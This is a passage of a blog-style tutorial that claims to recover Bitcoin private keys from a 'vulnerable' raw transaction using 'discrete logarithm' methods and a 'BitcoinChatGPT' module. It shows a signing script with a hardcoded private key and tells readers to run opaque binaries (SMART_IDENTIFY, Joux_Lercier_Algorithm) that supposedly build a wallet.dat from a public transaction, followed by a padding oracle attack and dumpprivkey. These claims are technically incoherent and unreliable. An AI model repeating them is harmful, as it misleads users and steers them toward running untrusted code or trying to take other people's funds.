<p><strong>Let’s open the Google Colab version:</strong></p>
</blockquote>



<p><a href="https://colab.research.google.com/drive/1Cohb5F2h1CP9CnYdAdMJW9vyl4pwQKuz">https://colab.research.google.com/drive/1Cohb5F2h1CP9CnYdAdMJW9vyl4pwQKuz</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-97b9ce2b1ac732b5d52989b21ac03ea9" style="color:#4092c2"><code><strong>State of a vulnerable transaction in Bitcoin:

01000000
....01
........0dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935
............00000000
........8b483045
....0221
...........00
...........947d6fb75033cc3e342c8538a350e9058134b2a1ae01a7c50fc52b1f56c9169c
....0220
........5b3ec0d72a2368cdd48c17ff095ab1ab0b9824e010883539cbeb18141de6384b
.....0141
.....04e87e83f871df1439b7873b4ae449d15306cafc53e03a06fffb534b3bf25b58d8edca74b0faf5cf8c3aed6cad2bd79a7bce92ab53e07440d4590cbf31286d9335
....ffffffff
01
....d204000000000000
........1976
............a914
........f750c55bea03af8a720c46b5d6edea93644cdaf7
....88ac
00000000</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s combine all the output values ​​into one common line:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-be1abb8e5e2cddd0fbe3cb346114a243" style="color:#4092c2"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100947d6fb75033cc3e342c8538a350e9058134b2a1ae01a7c50fc52b1f56c9169c02205b3ec0d72a2368cdd48c17ff095ab1ab0b9824e010883539cbeb18141de6384b014104e87e83f871df1439b7873b4ae449d15306cafc53e03a06fffb534b3bf25b58d8edca74b0faf5cf8c3aed6cad2bd79a7bce92ab53e07440d4590cbf31286d9335ffffffff01d2040000000000001976a914f750c55bea03af8a720c46b5d6edea93644cdaf788ac00000000</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s open the BlockCypher option&nbsp;</strong><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener">“Decode A Transaction”</a></strong>&nbsp;:</p>
</blockquote>



<p><a href="https://live.blockcypher.com/btc/decodetx">https://live.blockcypher.com/btc/decodetx</a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-1-1024x547.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5035"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>After decoding the vulnerable Bitcoin Raw transaction we get the result:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-0b0865fcc14a90efc73a27954ac6714b" style="color:#4092c2"><code><strong>{
    "addresses": [
        "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK",
        "1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS"
    ],
    "block_height": -1,
    "block_index": -1,
    "confirmations": 0,
    "double_spend": false,
    "fees": 2606688996428,
    "hash": "07160d430b92d957a7b3f0284ec7ff6084629b6385476608a6da5858fcfc2716",
    "inputs": [
        {
            "addresses": [
                "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK"
            ],
            "age": 344419,
            "output_index": 0,
            "output_value": 2606688997662,
            "prev_hash": "35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d",</strong>
<strong>.......
.......
.......</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s pay attention to Bitcoin HASH160:&nbsp;<strong>f750c55bea03af8a720c46b5d6edea93644cdaf7</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-3.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5668"></figure></div>


<p><a href="https://github.com/demining/CryptoDeepTools/blob/50de2ffdd7f9f06a34049d1c72559aa16b1bf42c/37DiscreteLogarithm/DecodeRawTX.txt#L31C30-L31C70">https://github.com/demining/CryptoDeepTools/blob/50de2ffdd7f9f06a34049d1c72559aa16b1bf42c/37DiscreteLogarithm/DecodeRawTX.txt#L31C30-L31C70</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://coinbin.ru/#verify" target="_blank" rel="noreferrer noopener">Transaction Script</a></h2>



<h5 class="wp-block-heading">The above script has been decoded</h5>



<p>BitcoinChatGPT creates a transaction structure using&nbsp;<code><strong>HASH</strong></code>the public key, where we see that Bitcoin address:&nbsp;<strong><a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener">1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</a></strong>&nbsp;sends&nbsp;<strong><code>1234 satoshi</code></strong>to the same address within its network.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-2-1024x424.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5037"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Bitcoin HASH160 was generated using Python Script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/wif_to_hash160.py" target="_blank" rel="noreferrer noopener"><strong>wif_to_hash160.py</strong></a></p>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-3(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5039" style="width:840px;height:auto"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-4-1024x735.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5041"></figure></div>


<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/wif_to_hash160.py">https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/wif_to_hash160.py</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Question – Answer:</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-5-1024x439.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5043"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-6-1024x421.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5045"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-7-1024x451.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5046"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Finally, the&nbsp;<strong><a href="https://github.com/BitcoinChatGPT/Jacobian-Curve-Vulnerability-Algorithm/blob/main/BitcoinChatGPT_%E2%84%964_Joux_Lercier_Vulnerability_Algorithm.ipynb" target="_blank" rel="noreferrer noopener">BitcoinChatGPT</a></strong>&nbsp;module outputs the response to the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/KEYFOUND.privkey" target="_blank" rel="noreferrer noopener">KEYFOUND.privkey</a></strong>&nbsp;storing the private key in two most used formats&nbsp;<strong>HEX &amp; WIF</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-8-1024x680.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5047"></figure></div>


<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/KEYFOUND.privkey">https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/KEYFOUND.privkey</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://youtu.be/eqQw4vY4RmI" target="_blank" rel="noreferrer noopener">BitcoinChatGPT №6 Joux Lercier Vulnerability Algorithm</a></h2>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://www.youtube.com/watch?v=yRGZ41jvGKw"><img loading="lazy" decoding="async" width="748" height="428" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-5.png" alt="Discrete Logarithms" class="wp-image-3144" style="width:840px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-5.png 748w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-5-300x172.png 300w" sizes="auto, (max-width: 748px) 100vw, 748px"></a></figure></div>






<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://www.youtube.com/watch?v=yRGZ41jvGKw" target="_blank" rel="noreferrer noopener">Vulnerable&nbsp;Raw&nbsp;Transaction</a></h2>



<p>Let’s create a vulnerable Raw transaction from the received data using the&nbsp;&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener">Broadcast Bitcoin Transaction repository</a></strong></p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Download and install the source code, open the terminal and run the command:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-ed1ed2d6bd8eb54429f361c28733fbae" style="color:#4092c2"><code><strong>git clone https://github.com/smartibase/Broadcast-Bitcoin-Transaction.git
</strong></code></pre>



<p>Catalog:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-37c252389923970f49833153c041c31d" style="color:#4092c2"><code><strong>cd Broadcast-Bitcoin-Transaction</strong></code></pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s install three important libraries:</p>
</blockquote>



<ul class="wp-block-list">
<li><a href="https://pypi.org/project/zmq/" target="_blank" rel="noreferrer noopener"><strong>zmq</strong></a></li>



<li><a href="https://pypi.org/project/urllib3/" target="_blank" rel="noreferrer noopener"><strong>urllib3</strong></a></li>



<li><a href="https://pypi.org/project/requests/" target="_blank" rel="noreferrer noopener"><strong>requests</strong></a></li>
</ul>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-8-1024x495.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-4733"><figcaption class="wp-element-caption"><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/requirements.txt" target="_blank" rel="noreferrer noopener"><strong>requirements.txt</strong></a></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s run the command:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-c3638457a19a8e59dfd773c6eeb0aa38" style="color:#4092c2"><code><strong>pip install -r requirements.txt</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the main file in&nbsp;<a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/" target="_blank" rel="noreferrer noopener">Notepad&nbsp;</a><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/">++</a>&nbsp;and make a small change to the Python Script code:&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/main.py" target="_blank" rel="noreferrer noopener">main.py</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-a82bc4470ec38fe7bfdbc705de88fba2" style="color:#4092c2"><code><strong>from io import BytesIO
from secp256k1 import *
from sighash import *

pk = PrivateKey.parse("5JdUtcYt3ZBQN8aPZWNffXzNCTPds7aQtJk7zc9iQShNQ9yWe7x")
pk.address()
tx = bytes.fromhex("35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d")
index = 0
send = "1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS"
tx_in = TxIn(tx, index, b'', 0xffffffff)
tx_in._script_pubkey = Tx.get_address_data(pk.address())['script_pubkey']
tx_in._value = 2345
tx_ins = [ tx_in ]
tx_outs = [
    TxOut(1234, Tx.get_address_data(send)['script_pubkey'].serialize())
]
tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
signature(tx, 0, pk)
tx.serialize().hex()
print(tx.serialize().hex())
f = open("RawTX.txt", 'w')
f.write("" + tx.serialize().hex() + "" + "\n")
f.close()</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s run the command:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-ba63856e6306b76b5e1e36b8e2c44d96" style="color:#4092c2"><code><strong>python main.py</strong></code></pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE">Vulnerable transaction created&nbsp;</a><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE" target="_blank" rel="noreferrer noopener">!</a></strong></p>
</blockquote>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s open the RawTX file in the directory:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-be1abb8e5e2cddd0fbe3cb346114a243" style="color:#4092c2"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100947d6fb75033cc3e342c8538a350e9058134b2a1ae01a7c50fc52b1f56c9169c02205b3ec0d72a2368cdd48c17ff095ab1ab0b9824e010883539cbeb18141de6384b014104e87e83f871df1439b7873b4ae449d15306cafc53e03a06fffb534b3bf25b58d8edca74b0faf5cf8c3aed6cad2bd79a7bce92ab53e07440d4590cbf31286d9335ffffffff01d2040000000000001976a914f750c55bea03af8a720c46b5d6edea93644cdaf788ac00000000</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">The order of actions in the video:</h2>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE"><img loading="lazy" decoding="async" width="748" height="429" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-6.png" alt="Discrete Logarithms" class="wp-image-3145" style="width:840px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-6.png 748w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-6-300x172.png 300w" sizes="auto, (max-width: 748px) 100vw, 748px"></a></figure></div>






<hr class="wp-block-separator has-alpha-channel-opacity">



<p><em>As we know from&nbsp;<a href="https://keyhunters.ru/what-is-prompt-answers-and-how-is-it-related-to-machine-learning-and-artificial-intelligence/">the prompt responses of the&nbsp;</a><a href="https://colab.research.google.com/drive/1Cohb5F2h1CP9CnYdAdMJW9vyl4pwQKuz" target="_blank" rel="noreferrer noopener"><strong>BitcoinChatGPT</strong></a>&nbsp;module ,&nbsp;Joux Lercier Vulnerability Algorithm can be used to solve complex cryptographic problems.</em></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://github.com/smartibase/Smart-Transformers" target="_blank" rel="noreferrer noopener">Smart Transformers</a></h2>



<p><a href="https://github.com/smartibase/Smart-Transformers" target="_blank" rel="noreferrer noopener">We will apply Smart Transformers</a>&nbsp;machine learning&nbsp;, integrate the notebook&nbsp;<code>Google Colab</code>with&nbsp;<a href="https://keyhunters.ru/pytorch-tensorflow-and-jax-powerful-tools-for-deep-learning/" target="_blank" rel="noreferrer noopener"><strong>Pytorch, TensorFlow, JAX</strong></a>&nbsp;and using the obtained data of the vulnerable&nbsp;<strong>Raw</strong>&nbsp;transaction for Bitcoin Address:&nbsp;<strong><a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener">1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</a></strong>&nbsp;we will create an unprotected&nbsp;<strong>wallet.dat</strong>&nbsp;file from the proposed choice of all existing algorithms from&nbsp;<a href="https://github.com/smartibase/Smart-Transformers" target="_blank" rel="noreferrer noopener"><strong>SMART_IDENTIFY</strong></a>&nbsp;. Then we will perform&nbsp;<a href="https://exploitdarlenepro.com/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS/" target="_blank" rel="noreferrer noopener"><strong>a Padding Oracle Attack</strong></a>&nbsp;on the newly created file:&nbsp;<strong>wallet.dat</strong>&nbsp;to decrypt the password into the original binary format in order to obtain and extract the private key from the&nbsp;<strong>Bitcoin Core</strong>&nbsp;software console using the standard </p>



<p><strong>Command:</strong></p>



<p class="has-text-color has-link-color wp-elements-b8050f18ede30d9cecebd65c5f278406" style="color:#4092c2"><strong><code>dumpprivkey 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</code></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong><a href="https://colab.research.google.com/#create=true" target="_blank" rel="noreferrer noopener">Let’s open a new Google Colab</a></strong>&nbsp;notebook&nbsp;using the link:</p>
</blockquote>



<p><a href="https://colab.research.google.com/#create=true">https://colab.research.google.com/#create=true</a></p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Clone the&nbsp;<a href="https://github.com/smartibase/Smart-Transformers" target="_blank" rel="noreferrer noopener"><strong>Smart Transformers repository</strong></a></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-0e81a03486a8cf1e5650ee50b407378c" style="color:#4092c2"><code><strong>!git clone https://github.com/smartibase/Smart-Transformers.git</strong></code></pre>



<pre class="wp-block-code has-text-color has-link-color wp-elements-632951219b9ef5ef12a9094e1ce22644" style="color:#4092c2"><code><strong>cd Smart-Transformers/</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-9-1024x487.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5048"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s install all the necessary packages and libraries:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-2c8f3e908370f30a871ab98849567239" style="color:#4092c2"><code><strong>!sudo apt-get update
!sudo apt install libtool
!sudo apt-get install g++</strong>
<strong>!python setup.py --help</strong>
<strong>!sudo apt-get install libgmp3-dev libmpfr-dev
!chmod +x Generic_Algorithms
!./Generic_Algorithms
!pip3 install transformers
from transformers import AutoModelForCausalLM, AutoTokenizer
model_name = "microsoft/DialoGPT-medium"
tokenizer = AutoTokenizer.from_pretrained(model_name)
model = AutoModelForCausalLM.from_pretrained(model_name)
model = model.cpu()</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-10-1024x434.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5049"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-11-1024x437.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5050"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Team:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-bca520022a768d38883e56a4e9824597" style="color:#4092c2"><code><strong>ls -S</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-12.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5051" style="width:840px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s add our vulnerable&nbsp;<strong>Raw</strong>&nbsp;transaction to a text document:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/RawTX.txt" target="_blank" rel="noreferrer noopener">RawTX.txt</a></strong>&nbsp;for this we will use the utility<code>echo</code></p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s run the command:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b051553e70b66302168f456d33990ed8" style="color:#4092c2"><code><strong>!echo '01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100947d6fb75033cc3e342c8538a350e9058134b2a1ae01a7c50fc52b1f56c9169c02205b3ec0d72a2368cdd48c17ff095ab1ab0b9824e010883539cbeb18141de6384b014104e87e83f871df1439b7873b4ae449d15306cafc53e03a06fffb534b3bf25b58d8edca74b0faf5cf8c3aed6cad2bd79a7bce92ab53e07440d4590cbf31286d9335ffffffff01d2040000000000001976a914f750c55bea03af8a720c46b5d6edea93644cdaf788ac00000000' &gt; RawTX.txt</strong>

<strong>!cat RawTX.txt</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-13-1024x118.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5052"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Now, to get the exact algorithm and method for cryptanalysis we need to identify the vulnerable&nbsp;<strong>RawTX</strong>&nbsp;using the&nbsp;<strong>SMART_IDENTIFY</strong>&nbsp;utility .</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s run the command:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-240fdaa09efd66594dcdbea0ea7b3c10" style="color:#4092c2"><code><strong>!./SMART_IDENTIFY</strong></code></pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>As a result, we get the&nbsp;<strong><a href="https://bitcoinchatgpt.org/joux-lercier-vulnerability-algorithm" target="_blank" rel="noreferrer noopener">Joux_Lercier_Algorithm</a></strong>&nbsp;method , in earlier studies the same thing was identified by the&nbsp;<a href="https://www.youtube.com/watch?v=eqQw4vY4RmI" target="_blank" rel="noreferrer noopener"><strong>BitcoinChatGPT</strong></a>&nbsp;module .</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-551191813893119b84938648157869a7" style="color:#4092c2"><code><strong>#################################################

Joux_Lercier_Algorithm

#################################################</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-14-1024x364.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5053"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s open the catalog:</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-15-1.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5056"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s start the process of creating the&nbsp;<strong>wallet.dat</strong>&nbsp;file. For this, we use the identified data of the vulnerable&nbsp;<strong>Raw</strong>&nbsp;transaction in the file:&nbsp;<strong>RawTX.txt.</strong>&nbsp;For the process, we apply the&nbsp;<strong>Joux_Lercier_Algorithm utility.</strong></p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s run the command:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-68a1c4de3c995b27fe32b00e707b55a3" style="color:#4092c2"><code><strong>!./Joux_Lercier_Algorithm -o RawTX.txt -s wallet.dat</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-16-1024x436.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5058"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-18-1024x427.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5060"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s open the directory in the left panel&nbsp;<code>Google Colab</code>and see the file:&nbsp;<strong><code>wallet.dat</code></strong>Successfully created!</p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-19-1024x531-1.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5062"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-20-1024x658-1.png" alt="Discrete Logarithms"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center has-text-color has-link-color wp-elements-83a6de34308b009290e5f761759ab745" style="color:#4092c2">Download and Install Bitcoin Core 0.18.0&nbsp;<a href="https://bitcoincore.org/bin/bitcoin-core-0.18.0" target="_blank" rel="noreferrer noopener">https://bitcoincore.org/bin/bitcoin-core-0.18.0</a></h2>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://www.youtube.com/watch?v=LTzMQPstvpM"><img loading="lazy" decoding="async" width="751" height="426" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-7.png" alt="Discrete Logarithms" class="wp-image-3146" style="width:840px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-7.png 751w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-7-300x170.png 300w" sizes="auto, (max-width: 751px) 100vw, 751px"></a></figure></div>






<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s open the console and run the command:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-1878b7529b18cb6f1b202acff2f4bb06" style="color:#4092c2"><code>
<strong>getaddressinfo 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong>
</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-21-1024x671.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5065"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>We see that the file:&nbsp;<strong><a href="https://keyhunters.ru/bitcoin-core-wallet-and-the-importance-of-the-wallet-dat-file/" target="_blank" rel="noreferrer noopener">wallet.dat</a></strong>&nbsp;belongs to the Bitcoin Address:&nbsp;<strong><a href="https://btc1.trezor.io/address/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener">1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</a></strong></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center has-text-color has-background has-link-color wp-elements-b160b45eaa849940cbc72bf6c52496dc" style="color:#943939;background-color:#f78da817">File: wallet.dat is encrypted with a password!</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-24.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-4839" style="width:839px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



